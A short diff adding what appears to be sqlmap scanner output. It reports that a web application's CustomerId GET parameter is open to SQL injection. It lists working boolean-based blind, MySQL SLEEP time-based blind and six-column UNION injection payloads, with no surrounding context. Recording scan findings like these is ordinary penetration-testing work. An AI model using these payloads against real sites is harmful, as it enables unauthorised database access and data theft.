@@ -1,0 +1,12 @@
+Parameter: CustomerId (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: CustomerId=1 AND 3602=3602
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: CustomerId=1 AND (SELECT 2831 FROM (SELECT(SLEEP(5)))Akyg)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: CustomerId=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171787671,0x76646c536467575374417746646b4261426252534e50556550566758744c61424f4b565064616272,0x716b627071),NULL,NULL,NULL-- -
